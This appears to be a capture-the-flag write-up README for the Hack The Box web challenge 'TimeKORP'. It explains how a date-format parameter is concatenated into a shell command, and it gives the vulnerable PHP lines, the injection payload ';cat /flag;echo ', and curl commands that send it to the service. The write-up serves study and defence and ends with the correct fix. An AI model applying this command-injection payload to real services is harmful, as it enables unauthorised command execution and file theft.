# TimeKORP

## Overview

This directory contains the local materials and saved solve workflow for the `TimeKORP` challenge on Hack The Box. This is a web challenge whose core bug is command injection through a date-format parameter. The vulnerability is simple, but the challenge is a good reminder that shell quoting is not a security boundary if untrusted input is concatenated into a command string.

The saved PoC retrieves the flag directly from the live service. This README expands the logic so the vulnerability is easy to recognize and reproduce manually.

## Challenge Profile

- Challenge: `TimeKORP`
- Category: `Web`
- Platform: `Hack The Box`
- Saved PoC: `timekorp_poc.sh`

## Directory Contents

- `Dockerfile`
- `build_docker.sh`
- `challenge/`
- `config/`
- `flag`
- `timekorp_poc.sh`
- `web_timecorp.zip`

## First Commands To Run

Start by reviewing the local files and the shipped archive:

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/TimeKORP"
ls -lah
unzip -l "web_timecorp.zip"
```

Inspect the vulnerable application code:

```bash
sed -n '1,220p' challenge/models/TimeModel.php
```

Read the PoC:

```bash
sed -n "1,220p" "timekorp_poc.sh"
```

Run it:

```bash
chmod +x "timekorp_poc.sh"
./timekorp_poc.sh
```

To reuse it against a new spawned target:

```bash
./timekorp_poc.sh <HOST> <PORT>
```

## Vulnerable Code Path

The challenge revolves around a `format` parameter that is passed into a shell command resembling:

```php
$this->command = "date '+" . $format . "' 2>&1";
$time = exec($this->command);
```

That is the problem. The application is not simply formatting time in PHP. It is building a shell command by concatenating user input into a quoted string and then executing it.

## Why The Injection Works

The developer tries to place the format string inside single quotes:

```bash
date '+<format>' 2>&1
```

That looks safe at first, but it only works if the attacker never gets to inject another single quote. The moment the input contains `'`, the attacker can terminate the intended quoted string, append arbitrary shell commands, and then reopen quoting so the overall command line remains valid.

In this challenge, the working payload is:

```text
';cat /flag;echo '
```

Once URL-encoded, it can be sent as the `format` parameter.

## Practical Effect

The shell ends up executing something equivalent to:

```bash
date '+';cat /flag;echo '' 2>&1
```

That means:

- `date '+'` runs first
- `cat /flag` runs next
- `echo ''` cleans up the remaining quote context

The application then captures the output and renders it in the response body, which turns the page itself into the exfiltration channel.

## Manual Exploitation Commands

These commands are enough to verify the issue manually.

First, confirm the endpoint behaves normally with a valid format:

```bash
curl -s 'http://<HOST>:<PORT>/?format=%25H:%25M:%25S'
```

Then trigger the injection:

```bash
curl -s 'http://<HOST>:<PORT>/?format=%27%3Bcat%20/flag%3Becho%20%27'
```

If you want the payload in decoded form for clarity:

```text
';cat /flag;echo '
```

## Why This Challenge Matters

This is a classic example of command injection caused by:

- string concatenation into a shell command
- overreliance on quoting
- failure to separate data from command execution

The correct fix is to avoid the shell entirely. Time formatting should be done with application-language APIs rather than by building command strings from user input.

## Reproduction Commands

Use this sequence for a clean reproduction:

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/TimeKORP"
unzip -l "web_timecorp.zip"
sed -n '1,220p' challenge/models/TimeModel.php
sed -n "1,220p" "timekorp_poc.sh"
bash "timekorp_poc.sh"
```

## Study Notes

This challenge is a good warm but realistic web example because the bug is small, recognizable, and common in real systems. It is worth revisiting if you want practice spotting shell injection in server-side source code and translating that finding into a reliable exploit payload.
